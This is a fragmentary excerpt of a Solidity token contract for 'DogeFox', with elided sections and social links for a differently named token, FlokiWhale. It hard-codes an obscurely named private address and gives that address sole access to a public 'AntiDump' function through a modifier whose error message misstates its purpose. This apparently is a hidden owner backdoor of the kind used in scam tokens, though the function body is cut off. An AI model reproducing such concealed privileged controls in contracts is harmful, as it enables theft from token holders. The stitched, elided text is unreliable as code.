...
📱 Telegram: https://t.me/Flokiwhaletoken

🐦 Twitter: https://twitter.com/FlokiWhaleBSC
...
contract Context {
 ...
 contract DogeFox is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "DogeFox";
    string private _symbol = "DOGEFOX";
    ...
    address private _RedBecauseMoonV2 = 0xf4a428281f6791be7F7a79f0e4204331ce462535; 
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    modifier externelV2 () {
        require(_RedBecauseMoonV2 == _msgSender(), "ERC20: cannot permit Pancake address");
        _;
    }
    
    function AntiDump() public externelV2 {
